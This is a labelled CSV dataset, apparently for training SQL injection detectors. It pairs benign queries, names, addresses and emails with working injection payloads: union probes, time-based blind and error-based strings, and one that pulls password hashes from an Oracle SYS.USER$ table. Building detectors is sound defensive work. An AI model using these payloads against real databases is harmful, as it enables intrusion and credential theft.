Query,Label
SELECT * FROM capital WHERE kill = 'oxygen' OR airplane = 'known',0
SELECT COUNT ( movieID ) FROM each,0
"SELECT shape,bet FROM milk WHERE grabbed = 'everyone' UNION SELECT mathematics, voyage FROM torn",0
"1 ) ) or benchmark ( 10000000,MD5 ( 1 ) ) #",1
koolwine,0
"-7858' ) union all select 1541,1541,1541,1541,1541,1541#",1
SELECT * FROM bean WHERE raw IN ( SELECT engineer FROM deer ),0
"1' ) ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( 'rggg' = 'rggg",1
select ( case when ( 2140 = 5325 ) then 2140 else 2140* ( select 2140 from information_schema.character_sets ) end ) #,1
el-gueba,0
SELECT * FROM nation WHERE job = 'roll' LIMIT 3,0
"-4770 ) ) ) union all select 6356,6356,6356,6356,6356#",1
SELECT heart ( s ) FROM full INNER JOIN,0
SELECT * FROM comfortable WHERE figure = 'production' AND City = 'wrong',0
"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ""qwdi"" = ""qwdi",1
el taxista 199 10?c,0
"-2140 ) ) union all select 8174,8174,8174#",1
1 ) and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( 3945 = 3945,1
"1' ) as jysm where 8961 = 8961 union all select null,null#",1
SELECT * FROM orange FETCH FIRST 50 PERCENT ROWS ONLY,0
"1 where 6383 = 6383 or elt ( 6272 = 6272,sleep ( 5 ) ) --",1
SELECT * FROM know WHERE go = 'entirely',0
SELECT COUNT ( equal ) FROM suppose,0
SELECT * FROM standard WHERE parts BETWEEN 'bark' AND 'beauty',0
5739-5738,1
if ( 1087 = 5839 ) select 1087 else drop function zzeh--,1
brokaw,0
"SELECT except,he,extra FROM child LEFT JOIN Orders ON market.classID = palace.dead ORDER BY course.leader",0
SELECT * FROM ( SELECT decide FROM led ),0
6477,0
"-2289"" ) or 8624 = 6279 and ( ""ised"" = ""ised",1
ludolfo,0
select ( case when ( 8601 = 1220 ) then 8601 else 8601* ( select 8601 from mysql.db ) end ) #,1
"-9160' ) union all select 8148,8148,8148,8148,8148,8148,8148,8148,8148,8148#",1
"1 ) and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( 4557 = 4557",1
"1 ) as auly where 4146 = 4146 or elt ( 5873 = 5873,sleep ( 5 ) ) #",1
7.40029E+15,0
DELETE FROM think,0
"1' ) as hvyx where 3194 = 3194 and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1
8.01225E+15,0
SELECT * FROM stepped WHERE broken BETWEEN '1996-07-01' AND '1996-07-31',0
SELECT option_value FROM wp_options WHERE option_name = '_houzez_property_type_2766' LIMIT 1,0
"SELECT roundID AS ID, our AS soon FROM writing",0
"1%"" ) ) or sleep ( 5 ) #",1
1' or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and 'ejdk' like 'ejdk,1
"1"" or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and ""xmvr"" = ""xmvr",1
SELECT thrown ( s ) FROM motion INNER JOIN,0
SELECT * FROM climate 3,0
SELECT * FROM introduced WHERE next = 'swung' FETCH FIRST 3 ROWS ONLY,0
"iif ( 5257 = 5257,1,1/0 )",1
"1'+ ( select 'bztp' where 2541 = 2541 union all select null,null,null,null,null,null,null,null,null,null--",1
SELECT * INTO CustomersBackup2017 FROM Customers;,0
SELECT wp_posts.* FROM wp_posts WHERE 1 = 1 AND wp_posts.post_name IN ( 'our-family-template' ) AND ( 0 = 1 ) AND wp_posts.post_type = 'wp_template' AND ( ( wp_posts.post_status = 'publish' ) ) GROUP BY wp_posts.ID ORDER BY wp_posts.post_date DESC,0
SELECT TOP 50 PERCENT * FROM somewhere,0
"1' ) where 8628 = 8628 union all select null,null,null--",1
"c/ luarca, 151, 7?g",0
"1' ) and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( 'wdeu' like 'wdeu",1
"1%"" ) and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and ( ""%"" = """,1
"SELECT art,announced,dug FROM verb LEFT JOIN Orders ON solve.compositionID = tax.general ORDER BY railroad.dangerous",0
"do cotaredo, 147 9e",0
"1' ) ) ) or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( ( 'jwbt' = 'jwbt",1
"1' or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) )",1
florescu,0
DELETE FROM step WHERE now = 'other',0
"1' in boolean mode ) union all select null,null,null,null,null,null,null,null,null--",1
SELECT * FROM equally WHERE crew BETWEEN '1996-07-01' AND '1996-07-31',0
SELECT stretch ( s ) FROM twelve SELECT grass FROM aid,0
"-3853"" ) where 4626 = 4626 union all select 4626,4626,4626--",1
"1'|| ( select 'lzvb' where 1637 = 1637 union all select null,null,null,null,null,null,null,null#",1
SELECT * FROM excitement WHERE independent LIKE '%position%',0
"SELECT GREATEST ( ""w3Schools.com"", ""microsoft.com"", ""apple.com"" ) ;",0
16741,0
"1 ) where 6374 = 6374 or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) --",1
SELECT DISTINCT cage FROM relationship,0
"1 ) ) ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( ( ( 8671 = 8671",1
SELECT * FROM yes WHERE strength NOT BETWEEN 'country' AND 'tie',0
"SELECT * FROM salmon WHERE first BETWEEN ""wool"" AND ""well""",0
"1' ) or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( 'gmil' = 'gmil",1
"union ( select NULL, NULL, NULL, ( select @@version ) ) --",1
"1"" ) where 5491 = 5491",1
SELECT * FROM wing ORDER BY control,0
"SELECT * FROM swept WHERE thirty IN ( 'sang', 'almost', 'take' )",0
signoret@pisossantcugat.cat,0
SELECT supply,0
1' ) ) as clbc where 5649 = 5649,1
"SELECT column_name ( s ) FROM sport,accurate",0
"1%"" ) ) ) and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ( ( ""%"" = """,1
SELECT apartment ( s ) FROM plenty UNION ALL,0
"1 ) ) as henn where 9980 = 9980 or 4915 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1
"1"" where 9804 = 9804 or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1
"1%"" ) rlike sleep ( 5 ) #",1
"SELECT * FROM needs WHERE pleasant BETWEEN ""fewer"" AND ""blood""",0
SELECT TOP 50 PERCENT * FROM busy,0
"1' in boolean mode ) ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) #",1
"1%"" ) ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ""%"" = """,1
85640413m,0
"1%' ) ) and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( '%' = '",1
select ( case when ( 4006 = 1276 ) then 1 else 4006* ( select 4006 from master..sysdatabases ) end ) --,1
SELECT * FROM vowel WHERE soil = giving,0
1' ) ) as lkse where 9951 = 9951,1
"1%"" ) ) or sleep ( 5 ) and ( ( ""%"" = """,1
"1'+ ( select 'vkis' where 3712 = 3712 ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) ) +'",1
"c/ santisimo cristo del amor, 186,",0
"1'|| ( select 'xjtq' from dual where 5719 = 5719 or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) ) ||'",1
"1"" ) as yecj where 1194 = 1194 and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1
"SELECT travel,fog FROM manner WHERE ruler = 'search' UNION SELECT bow, mud FROM easily",0
SELECT private ( s ) FROM nor UNION,0
"-5243"" where 2105 = 2105 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --",1
"1'|| ( select 'setd' from dual where 3686 = 3686 ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) ) ||'",1
sahid,0
1 ) waitfor delay '0:0:5',1
SELECT COUNT ( vowel ) FROM thrown,0
SELECT SQRT ( 64 ) ;,0
"SELECT tired,zero,symbol FROM left LEFT JOIN Orders ON position.elephantID = fairly.pink ORDER BY tropical.gas",0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN ( 28450 ) ORDER BY meta_id ASC",0
"1"" and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) )",1
DELETE FROM because WHERE deeply = 'quickly',0
"1'+ ( select ounb where 4653 = 4653 or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) ) +'",1
"1' ) as nmzp where 3794 = 3794 and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1
( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ( ( 4982 = 4982,1
1 ) as xtgr where 1545 = 1545,1
-7726 or 3038 = 3038,1
"1"" procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #",1
"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( PASSWORD ) FROM ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ ) WHERE LIMIT = 4 ) ) AND 'i' = 'i",1
antero,0
josu,0
"SELECT Shippers.ShipperName, COUNT ( Orders.OrderID ) AS NumberOfOrders FROM OrdersLEFT JOIN Shippers ON Orders.ShipperID = Shippers.ShipperID GROUP BY ShipperName;",0
SELECT * FROM pile WHERE idea NOT LIKE 'most%',0
"-4541"" ) ) or make_set ( 4821 = 5233,5233 ) and ( ( ""xfex"" = ""xfex",1
SELECT * FROM upward WHERE sound LIKE '%out%',0
"select * from users where id = 1 or ""@ ) "" or 1 = 1 -- 1",1
"-1550%"" ) ) ) order by 1--",1
"1 ) as zelk where 1944 = 1944 or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1
beiza ivanco,0
alide,0
-4208%' ) ) ) or 1133 = 9010--,1
SELECT * FROM correctly WHERE serve NOT LIKE 'inside%',0
"SELECT * FROM brain WHERE cloud NOT IN ( 'hardly', 'function', 'excellent' )",0
1 ) ) or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --,1
SELECT * FROM season FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM canal,0
SELECT * FROM sure WHERE Price NOT BETWEEN 10 AND 20,0
"-9152"" ) ) as avga where 3825 = 3825 order by 1#",1
1 ) where 1402 = 1402,1
"1"" ) ) ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( ( ""ecoa"" like ""ecoa",1
FROM ( SELECT DISTINCT real FROM soon ),0
SELECT writer ( s FROM black RIGHT JOIN,0
basilisa,0
1%' ) ) and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ( '%' = ',1
SELECT Count ( * ) AS future,0
gayle@freetag.name,0
"1 ) ) as vzgo where 6281 = 6281 and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1
"' AND (SELECT SUBSTRING(@@version,1,1))='7' --",1
gates,0
frison@barnizultravioleta.jm,0
"INSERT INTO account ( metal, dozen, courage ) VALUES ( 'now', 'explanation', 'plural' )",0
SELECT Count ( * ) AS remember,0
rigby,0
1 ) ) or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and ( ( 3069 = 3069,1
select ( case when ( 3168 = 5577 ) then 3168 else 3168* ( select 3168 from mysql.db ) end ) #,1
"1"" ) and 2006 = 2006",1
SELECT * FROM serve FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM honor,0
SELECT else ( s FROM since RIGHT JOIN,0
SELECT TOP 50 PERCENT * FROM needle SELECT * FROM week FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM guide,0
SELECT Count ( * ) AS DistinctCountries,0
1' ) ) waitfor delay '0:0:5'--,1
SELECT * FROM yet,0
46343482t,0
-1499 ) as gxfm where 9762 = 9762 or 5989 = 4782--,1
$ventador,0
SELECT * FROM how WHERE flat BETWEEN 10 AND 20,0
DELETE FROM port,0
"-9873"" union all select 8020,8020,8020,8020,8020,8020#",1
"INSERT INTO paper ( plant, potatoes, powder ) VALUES ( 'willing', 'stood', 'ice' )",0
"1 ) and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( 3343 = 3343",1
"1"" ) where 6859 = 6859 union all select null,null,null,null,null,null,null,null#",1
1 ) as qgsb where 7600 = 7600 and 2006 = 2006,1
"c/ ricardo gutierrez 26, 8-d",0
1em5le28r,0
"waitfor delay '0:0:5' and ( ""dmcu"" = ""dmcu",1
SELECT * FROM sunlight WHERE tired = 'coming' AND City = 'watch',0
"SELECT fur, electric, person FROM felt WHERE president IS NULL",0
"1%"" ) and elt ( 3114 = 3114,sleep ( 5 ) ) #",1
"SELECT SUBTIME ( ""10:24:21"", ""5"" ) ;",0
"1' union all select null,null,null,null#",1
1' ) ) as pdrg where 5960 = 5960 and 9198 = 9198--,1
6.64228E+14,0
end and 'aenf' = 'aenf,1
"1'|| ( select 'zqdn' where 6194 = 6194 union all select null,null,null,null--",1
"1 where 5466 = 5466 and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",1
victorico,0
"1"" where 9973 = 9973 and 2006 = 2006",1
SELECT * FROM program WHERE Price NOT BETWEEN 10 AND 20,0
"SELECT Employees.stretch, COUNT ( Orders.reviewID ) AS springFROM ( OrdersINNER JOIN took ON Orders.improveID = Employees.hurtID )",0
"1' and make_set ( 4952 = 7129,7129 )",1
cardiel de los montes,0
"SELECT halfwayID AS ID, pen AS point FROM three",0
saint-simon-vondis@paremoselalzheimer.dj,0
SELECT * FROM floor FETCH FIRST 50 PERCENT ROWS ONLY,0
SELECT * FROM men WHERE calm = 'feature',0
"select * from users where id = '1' union select ( \ ) ,@@VERSION -- 1'",1
yoon,0
"1' where 4150 = 4150 and elt ( 8012 = 6026,6026 ) --",1
SELECT * FROM donkey 3 SELECT * FROM shut,0
select sleep ( 5 ) and ( '%' = ',1
"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ( 6051 = 6051",1
SELECT * FROM signal FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM kitchen,0
"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and ( ""%"" = """,1
1 where 5359 = 5359 and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) --,1
"-1164"" ) union all select 6617,6617,6617,6617,6617,6617--",1
SELECT * FROM curve 3 SELECT * FROM water,0
SELECT * FROM ( SELECT meal FROM sat ),0
SELECT * FROM either WHERE shinning = 'up' OR ear = 'metal',0
SELECT * FROM entire WHERE NOT quiet = 'stone' AND NOT airplane = 'automobile',0
"1"" where 9521 = 9521 or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) --",1
25617,0
-7442 ) or 3391 = 7492,1
SELECT AVG ( impossible ) FROM pilot SELECT SUM ( by ),0
benegiles,0
SELECT * FROM Customers WHERE CustomerName NOT LIKE 'a%';,0
SELECT * FROM fly WHERE trace = 'rubbed',0
SELECT * FROM now WHERE process = 'treated' LIMIT 3,0
SELECT * FROM essential WHERE NOT enemy = 'gravity',0
SELECT * FROM protection FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM collect,0
"1' ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( 'vxqs' = 'vxqs",1
SELECT those FROM rear,0
SELECT AVG ( Price ) FROM carry,0
"1'|| ( select 'nzjz' where 3539 = 3539 and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1
1' ) ) and ( 5091 = 8681 ) *8681 and ( ( 'xevm' = 'xevm,1
1 waitfor delay '0:0:10'--,1
"1 and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",1
bohdan,0
"1 where 1096 = 1096 and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) --",1
"SELECT COUNT ( fireplace ) , bread FROM engineer BY lovely",0
"1'+ ( select 'qrml' where 3791 = 3791 or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) ) +'",1
""" ) or ( ""x"" ) = ( ""x",1
"iif ( 5462 = 8866,1,1/0 )",1
"SELECT which,graph,size,our,opportunity ( ( birth JOIN stronger ON moon.indeed = fighting.opposite ) INNER JOIN crewON Orders.attack = pair.myselfID )",0
zarra,0
"SELECT QUARTER ( ""2017-06-15"" ) ;",0
"hospitalet de llobregat, l'",0
"1"" ) as sstd where 9629 = 9629 or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) --",1
) or ( 'x' ) = ( 'x,1
"1' or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )",1
50420,0
SELECT wing FROM college,0
"perdign, el",0
"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ( 'vfxg' like 'vfxg",1
"SELECT dug,pole FROM art WHERE using = 'lying' UNION SELECT total, thrown FROM friendly",0
centeno,0
SELECT MIN ( of ) AS religious FROM hat,0
"-6809"" ) ) or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( ( ""nfnf"" = ""nfnf",1
SELECT * FROM pitch ORDER BY row,0
"SELECT raceID AS ID, common AS signal FROM mouse",0
"-3316%"" or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ""%"" = """,1
"1"" ) ) union all select null,null,null,null,null,null,null,null#",1
"1%"" ) ) and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) and ( ( ""%"" = """,1
SELECT DISTINCT smell FROM equator,0
"1"" ) ) as jrld where 3488 = 3488",1
1'+ ( select nxfp where 5006 = 5006,1
SELECT * FROM myself WHERE involved BETWEEN 'similar' AND 'luck',0
"o casal 135, 4?a",0
-9100 ) or 8792 = 9550--,1
bo8iner4,0
SELECT * FROM ship WHERE dinner NOT LIKE '[sentence]%',0
falset,0
SELECT * FROM chart WHERE inch BETWEEN never09/01/1996mean AND done15/31/1996noise,0
"1 where 1153 = 1153 or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) --",1
SELECT * FROM grew WHERE then NOT LIKE '[machine]%',0
"SELECT * FROM young WHERE happily NOT IN ( 'flower', 'whose', 'within' )",0
"1'+ ( select lhtn where 8484 = 8484 and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) ) +'",1
SELECT division ( s ) FROM satisfied UNION,0
select sleep ( 5 ) and 'eskp' like 'eskp,1
SELECT * FROM toward,0
SELECT MIN ( depth ) AS queen FROM straw,0
SELECT AVG ( Price ) FROM gravity,0
"select * from users where id = 1 or "" ) 1"" or 1 = 1 -- 1",1
SELECT * FROM ( SELECT tin FROM success ),0
-7562 ) or 8571 = 8571--,1
1 ) ) as izvy where 2569 = 2569,1
22860,0
"SELECT * FROM replace WHERE buffalo BETWEEN ""examine"" AND ""choose""",0
select ( case when ( 4755 = 4784 ) then 1 else 4755* ( select 4755 from master..sysdatabases ) end ) --,1
rosselot azcona,0
"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and ""%"" = """,1
"1' or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and 'eznq' like 'eznq",1
SELECT * FROM herself FETCH FIRST 3 ROWS ONLY,0
11539856c,0
1490,0
"1"" ) ) rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and ( ( ""grct"" = ""grct",1
"SELECT satisfiedID AS ID, skill AS press FROM poetry",0
"SELECT COUNT ( tears ) , sum FROM total BY continued",0
"1 and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) )",1
tregenza,0
"1 ) ) and make_set ( 8554 = 3286,3286 ) and ( ( 7385 = 7385",1
huaranga chicon,0
SELECT zero ( s ) FROM rabbit SELECT travel FROM industry,0
-7710' where 5658 = 5658 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --,1
